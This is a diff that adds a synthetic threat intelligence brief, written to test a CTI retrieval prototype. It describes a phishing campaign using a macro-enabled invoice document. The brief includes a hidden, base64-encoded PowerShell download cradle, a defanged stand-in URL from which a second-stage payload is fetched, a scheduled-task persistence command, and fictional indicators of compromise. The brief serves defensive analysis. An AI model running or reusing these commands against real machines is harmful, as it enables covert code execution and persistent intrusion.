@@ -1,0 +1,34 @@
+Threat Brief: Operation GREY FEATHER
+Synthetic sample written for testing the CTI-RAG prototype. All names, hosts and indicators are fictional.
+Date: 2026-10-12 | TLP:CLEAR
+
+Summary
+GREY FEATHER is a financially motivated intrusion set that targeted accounts-payable teams at mid-sized manufacturing companies. The campaign began with spearphishing emails that carried a macro-enabled Word document named Invoice_Q3_2291.docm.
+
+Initial access and execution
+Victims received an email from billing@supplier-portal[.]example claiming that an invoice was overdue. When the user opened Invoice_Q3_2291.docm and enabled content, a VBA macro launched PowerShell with an encoded command:
+
+powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA
+
+The decoded script downloaded a second-stage payload from hxxp://203.0.113[.]5/upd/wsus_helper.exe and saved it as C:\Users\Public\wsus_helper.exe.
+
+Persistence
+The attacker created a scheduled task that runs the payload every 30 minutes:
+
+schtasks /create /sc minute /mo 30 /tn "WSUS Helper" /tr "C:\Users\Public\wsus_helper.exe" /f
+
+A Run key was also added for the current user at HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WsusHelper, pointing to the same file.
+
+Command and control
+wsus_helper.exe beaconed over HTTPS to update-check[.]example[.]net every 60 seconds using a fake browser user agent.
+
+Indicators of compromise
+- Invoice_Q3_2291.docm SHA256: 03ef962f768488019da1ef047d0c4ce717450b0c5256c3cded8d79c184417333
+- wsus_helper.exe SHA256: 075e8f4de5845d23e1f889a35f3227500208cb763eb34e14731f222ac670d5b9
+- wsus_helper.exe MD5: e38525b970c1d75e20588f9a4ae73560
+- 203.0.113[.]5
+- update-check[.]example[.]net
+- billing@supplier-portal[.]example
+
+Recommendations
+Block macros in files from the internet, alert on encoded PowerShell command lines, and review scheduled tasks created by user accounts.
